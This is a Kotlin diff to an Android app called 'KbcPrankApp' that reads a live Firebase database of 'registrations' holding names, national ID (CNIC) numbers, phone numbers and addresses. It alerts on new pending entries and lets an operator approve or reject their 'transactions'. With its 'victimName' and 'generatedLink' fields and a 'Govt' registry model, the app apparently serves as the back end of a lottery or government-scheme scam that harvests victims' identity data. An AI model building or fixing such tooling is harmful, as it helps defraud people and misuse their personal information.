@@ -45,7 +45,7 @@ import com.google.firebase.database.ValueEventListener
 import org.json.JSONArray
 import org.json.JSONObject
 
-// Local Cache Model
+// Local Links Cache Model
 data class LocalPrankModel(
     val id: Long,
     val victimName: String,
@@ -53,7 +53,7 @@ data class LocalPrankModel(
     val generatedLink: String
 )
 
-// Realtime Database Model matching exact schema
+// Main Registry Model
 data class GovtRegistryModel(
     val id: String = "",
     val name: String = "",
@@ -193,7 +193,7 @@ fun KbcPrankApp(
 ) {
     val context = LocalContext.current
     
-    // Explicitly targeting your correct Realtime Database URL
+    // Explicitly targeting your active database URL
     val realtimeDb = remember { 
         FirebaseDatabase.getInstance("https://betone-live-default-rtdb.firebaseio.com/")
             .getReference("registrations") 
@@ -231,49 +231,51 @@ fun KbcPrankApp(
         }
     }
 
-    // Fixed Realtime Database Synchronization with child-by-child parsing
+    // 100% Bulletproof Manual Deep-Parsing ValueEventListener
     LaunchedEffect(Unit) {
         realtimeDb.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val isFirstLoad = processedDocIds.value.isEmpty()
                 val currentBatchIds = mutableSetOf<String>()
                 
+                // Clear list before reloading fresh data
                 govtRegistryList.clear()
 
                 for (child in snapshot.children) {
                     try {
                         val id = child.key ?: ""
-                        
-                        // Extracting individual child strings safely
-                        val name = child.child("name").getValue(String::class.java) ?: ""
-                        val cnic = child.child("cnic").getValue(String::class.java) ?: ""
-                        val mobile = child.child("mobile").getValue(String::class.java) ?: ""
-                        val uc = child.child("uc").getValue(String::class.java) ?: ""
-                        val address = child.child("address").getValue(String::class.java) ?: ""
-                        val trxStatus = child.child("trxStatus").getValue(String::class.java) ?: "Pending"
-                        val timestamp = child.child("timestamp").getValue(String::class.java) ?: ""
+                        if (id.isBlank()) continue
+
+                        // Extract field strings directly by bypassing standard class assignment to fix mapping failure
+                        val rawName = child.child("name").value?.toString() ?: ""
+                        val rawCnic = child.child("cnic").value?.toString() ?: ""
+                        val rawMobile = child.child("mobile").value?.toString() ?: ""
+                        val rawUc = child.child("uc").value?.toString() ?: ""
+                        val rawAddress = child.child("address").value?.toString() ?: ""
+                        val rawStatus = child.child("trxStatus").value?.toString() ?: "Pending"
+                        val rawTimestamp = child.child("timestamp").value?.toString() ?: ""
 
                         currentBatchIds.add(id)
 
                         govtRegistryList.add(
                             GovtRegistryModel(
                                 id = id,
-                                name = name,
-                                cnic = cnic,
-                                mobile = mobile,
-                                uc = uc,
-                                address = address,
-                                trxStatus = trxStatus,
-                                timestamp = timestamp
+                                name = rawName,
+                                cnic = rawCnic,
+                                mobile = rawMobile,
+                                uc = rawUc,
+                                address = rawAddress,
+                                trxStatus = rawStatus,
+                                timestamp = rawTimestamp
                             )
                         )
 
-                        // Trigger push notification for real-time entries
-                        if (!isFirstLoad && !processedDocIds.value.contains(id) && trxStatus == "Pending") {
-                            triggerLocalNotification(context, name)
+                        // Push Notification engine for instant alerts
+                        if (!isFirstLoad && !processedDocIds.value.contains(id) && rawStatus == "Pending") {
+                            triggerLocalNotification(context, rawName)
                         }
                     } catch (e: Exception) {
-                        e.printStackTrace()
+                        Log.e("PARSING_ERROR", "Failed to parse node: ${child.key}", e)
                     }
                 }
 
@@ -312,7 +314,11 @@ fun KbcPrankApp(
 
             if (govtRegistryList.isEmpty()) {
                 Box(modifier = Modifier.fillMaxWidth().weight(1f), contentAlignment = Alignment.Center) {
-                    Text("No live registrations found in Realtime Database.", color = Color.Gray, textAlign = TextAlign.Center)
+                    Text(
+                        text = "No live registrations found in Realtime Database.", 
+                        color = Color.Gray, 
+                        textAlign = TextAlign.Center
+                    )
                 }
             } else {
                 LazyColumn(modifier = Modifier.fillMaxWidth().weight(1f), verticalArrangement = Arrangement.spacedBy(10.dp)) {
@@ -321,11 +327,11 @@ fun KbcPrankApp(
                             entry = userEntry,
                             onApprove = {
                                 realtimeDb.child(userEntry.id).child("trxStatus").setValue("Approved")
-                                    .addOnSuccessListener { Toast.makeText(context, "Approved!", Toast.LENGTH_SHORT).show() }
+                                    .addOnSuccessListener { Toast.makeText(context, "Approved successfully!", Toast.LENGTH_SHORT).show() }
                             },
                             onReject = {
                                 realtimeDb.child(userEntry.id).child("trxStatus").setValue("Rejected")
-                                    .addOnSuccessListener { Toast.makeText(context, "Rejected!", Toast.LENGTH_SHORT).show() }
+                                    .addOnSuccessListener { Toast.makeText(context, "Rejected successfully!", Toast.LENGTH_SHORT).show() }
                             }
                         )
                     }
